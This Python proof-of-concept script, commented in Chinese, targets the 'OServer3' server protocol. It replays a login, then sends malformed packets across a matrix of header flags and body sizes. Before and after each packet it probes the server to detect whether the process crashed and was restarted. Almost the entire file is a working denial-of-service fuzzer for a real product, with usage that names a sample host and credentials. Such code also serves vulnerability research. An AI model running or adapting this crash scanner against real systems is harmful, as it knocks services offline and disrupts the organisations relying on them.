"""poc_4E00_v2.py — 真正验证 OServer3 是否崩 + 自动发现崩溃 trigger

策略:
  1. 探测前先做 baseline: TCP connect + 收回应 → 验证 server 健康
  2. 发可疑 payload
  3. 探测后再做相同 baseline → 如果 server 短暂"无响应再恢复" = 进程崩了 (guard 在重启)
  4. 多组 flag/body 组合扫描

trigger 候选:
  - flags=0x4E00 / 0x4C00 / 0x4800 / 0xCE00 (高位 + CRYPT/COMP)
  - body size: 0, 4, 8, 15, 16, 17, 32, 48
  - body content: zero / 0xAA / random

用法:
  python poc_4E00_v2.py 192.168.2.130 8236 Admin admin123456
"""
import os, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.crypto import HDR_MAGIC, obf_header, deobf_header


def healthcheck(host, port, timeout=3.0):
    """简单 TCP+1001 hello 探活. 返回 True=server alive, False=down."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        # send minimal HELLO
        hdr = bytearray(32)
        hdr[0:2] = HDR_MAGIC
        struct.pack_into("<H", hdr, 2, 0x4500)
        struct.pack_into("<H", hdr, 4, 0x1001)
        # rest zero
        s.sendall(obf_header(bytes(hdr)))
        try:
            data = s.recv(32)
            s.close()
            return len(data) > 0
        except socket.timeout:
            s.close()
            return False
    except (socket.timeout, ConnectionError, OSError):
        return False


def fresh_session(host, port, user, pwd, timeout=15.0):
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    idx, lr, st, _ = replay_login(s, user, pwd, base_nonce, show_crypto=False, verbose=False)
    return s, base_nonce, idx, lr, st


def build_raw_packet(flags, cmd, sub, nonce, sess_state_16_24, fp8, raw_body):
    key16 = b"\x00" * 4 + struct.pack("<I", nonce) + sess_state_16_24
    hdr = bytearray(32)
    hdr[0:2] = HDR_MAGIC
    struct.pack_into("<H", hdr, 2, flags)
    struct.pack_into("<H", hdr, 4, cmd)
    struct.pack_into("<H", hdr, 6, sub)
    hdr[8:24] = key16
    hdr[24:32] = fp8
    struct.pack_into("<I", hdr, 28, len(raw_body))
    return obf_header(bytes(hdr)) + raw_body


def fire(host, port, user, pwd, flags, cmd, sub, body):
    try:
        s, bn, idx, lr, st = fresh_session(host, port, user, pwd)
    except Exception as e:
        return {"login_err": str(e)}
    try:
        next_nonce = (bn + idx) & 0xFFFFFFFF
        pkt = build_raw_packet(
            flags=flags, cmd=cmd, sub=sub, nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp8=SESSION_FP_DEFAULT, raw_body=body,
        )
        s.sendall(pkt)
        s.settimeout(2.0)
        try:
            d = s.recv(4096)
            return {"recv": len(d), "hex": d[:32].hex() if d else ""}
        except socket.timeout:
            return {"recv": "TIMEOUT"}
        except ConnectionResetError:
            return {"recv": "RST"}
        except OSError as e:
            return {"recv": f"OS:{e}"}
    finally:
        try: s.close()
        except: pass


def probe(host, port, user, pwd, flags, cmd, sub, body, label):
    pre_alive = healthcheck(host, port)
    r = fire(host, port, user, pwd, flags, cmd, sub, body)
    # 立刻探活
    time.sleep(0.3)
    post_alive_1 = healthcheck(host, port)
    if post_alive_1:
        # server 还活 → 没崩
        return f"{label}: alive (no crash). reply={r}"
    # server 死了 → 等 guard 重启 (最多 10s)
    for wait in range(20):
        time.sleep(0.5)
        if healthcheck(host, port):
            return f"💥 {label}: CRASH! server down for ~{wait*0.5+0.3:.1f}s then guard restarted. reply={r}"
    return f"💥💥 {label}: SERVER DEAD AND DIDN'T COME BACK in 10s. reply={r}"


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]

    print(f"[*] Healthcheck on {host}:{port}...")
    if not healthcheck(host, port):
        print("    server NOT alive at start. abort.")
        sys.exit(1)
    print("    ✓ server alive\n")

    # 扫描矩阵: 各种 flag + body 组合
    flag_candidates = [0x4E00, 0x4C00, 0x4A00, 0x4800, 0xCE00, 0xCC00,
                       0x5E00, 0x4F00, 0x4E01, 0x4E02]
    body_candidates = [
        ("0B", b""),
        ("1B", b"\x00"),
        ("4B 0", b"\x00" * 4),
        ("4B A", b"\xaa" * 4),
        ("4B DEAD", struct.pack("<I", 0xDEADBEEF)),
        ("15B 0", b"\x00" * 15),
        ("16B 0", b"\x00" * 16),
        ("17B 0", b"\x00" * 17),
        ("32B 0", b"\x00" * 32),
        ("32B A", b"\xaa" * 32),
        ("32B AES", os.urandom(32)),
    ]

    results = []
    for flags in flag_candidates:
        for blab, body in body_candidates:
            label = f"flags=0x{flags:04x} body={blab}"
            print(f"[trying] {label}")
            res = probe(host, port, user, pwd, flags, 0x4014, 6, body)
            print(f"   → {res}")
            if "CRASH" in res or "DEAD" in res:
                results.append(res)
            time.sleep(0.5)
    print()
    print("=" * 60)
    print("CRASH SUMMARY:")
    print("=" * 60)
    for r in results:
        print(r)
    if not results:
        print("(no crash found in this matrix)")


if __name__ == "__main__":
    main()
